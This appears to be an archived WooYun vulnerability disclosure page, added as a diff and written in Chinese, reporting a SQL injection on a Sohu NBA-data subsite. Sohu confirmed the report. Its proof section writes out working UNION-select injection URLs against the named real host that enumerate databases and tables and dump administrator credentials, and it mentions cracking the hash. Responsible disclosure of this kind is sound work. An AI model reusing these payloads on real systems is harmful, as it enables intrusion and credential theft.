@@ -1,0 +1,214 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		搜狐某分站SQL注入漏洞，权限比较大  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		搜狐某分站SQL注入漏洞，权限比较大  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/txcbg">txcbg</a> 
+</li><li>提交时间：		2014-01-06 10:10</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-06：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-01-26：	细节向普通白帽子公开<br/>
+									2014-02-05：	细节向实习白帽子公开<br/>
+									2014-02-20：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">搜狐某分站sql注入漏洞，权限比较大。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">搜狐的一个分站：NBA数据库 http://nbadata.m.sohu.com/存在明显的注入漏洞，并且连接数据库的用户权限比较大，可以跨库查询多个数据库中的敏感信息。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">注入点地址为：http://nbadata.m.sohu.com/nba/player.php?id=4483，参数id没有做适当的过滤，典型的数字型注入漏洞。直接访问如下地址就可以获得当前连接数据库的用户名和当前数据库的名字：<br />
+<br />
+http://nbadata.m.sohu.com/nba/player.php?id=4483 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,user(),16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,database()--<br />
+<br />
+可以看到接当前数据库的用户名为in，当前数据库的名字为nba，如图1。<br />
+<br />
+</p><p class="detail"><a href="../images/0601261423e447ceeb45fc9d93d38dc7ad11104d.jpg" target="_blank"><img src="../images/0601261423e447ceeb45fc9d93d38dc7ad11104d.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+发现可以列出多个数据库的名字，说明当前连接数据库的用户权限比较大。列出所有数据库的语句为：<br />
+<br />
+http://nbadata.m.sohu.com/nba/player.php?id=4483 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,unhex(hex(group_concat(SCHEMA_NAME))),16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33 from information_schema.SCHEMATA--<br />
+<br />
+结果如图2，列出的数据库真不少。<br />
+<br />
+</p><p class="detail"><a href="../images/060127161d79ba4d7c3839581b9ef5fc80760719.jpg" target="_blank"><img src="../images/060127161d79ba4d7c3839581b9ef5fc80760719.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+再来看下当前数据库中都有哪些表，访问如下地址：<br />
+<br />
+http://nbadata.m.sohu.com/nba/player.php?id=4483 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,unhex(hex(group_concat(TABLE_NAME))),16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33 from information_schema.TABLES where TABLE_SCHEMA=0x6E6261--<br />
+<br />
+结果如图3。<br />
+<br />
+</p><p class="detail"><a href="../images/060127473a15a62009a16dec7eccc6c8eb872c04.jpg" target="_blank"><img src="../images/060127473a15a62009a16dec7eccc6c8eb872c04.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+爆出管理员信息的语句如下：<br />
+<br />
+http://nbadata.m.sohu.com/nba/player.php?id=4483 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,concat_ws(0x3a,manage_id,manage_name,manage_pwd,real_name),16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33 from manage--<br />
+<br />
+结果如图4。管理员的密码虽然是加密过的hash，但发现在CMD5可以破解，如图5。<br />
+<br />
+</p><p class="detail"><a href="../images/06012830d2c020d9c67f2f091333a5d030cb6a1e.jpg" target="_blank"><img src="../images/06012830d2c020d9c67f2f091333a5d030cb6a1e.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/060129140d1b179d2b1ae38f23aa50216635f494.jpg" target="_blank"><img src="../images/060129140d1b179d2b1ae38f23aa50216635f494.jpg" alt="5.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+用sqlmap发现可以读其它数据库用户的密码，说明当前连接数据库用户的权限比较大。如图6。<br />
+<br />
+</p><p class="detail"><a href="../images/06012947ef8335a2a50aaae5348282eaf8064ca7.jpg" target="_blank"><img src="../images/06012947ef8335a2a50aaae5348282eaf8064ca7.jpg" alt="6.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+好了，点到为止吧，足以证明存在注入漏洞了吧。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们更专业。<br />
+<br />
+话说快过年了，能不能送个公仔啊，想送给家里的孩子，嘻嘻。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/txcbg" title="txcbg">txcbg</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-047991" title="搜狐某分站SQL注入漏洞，权限比较大">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2014-01-06 10:20</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢关注搜狐安全</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="47991";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
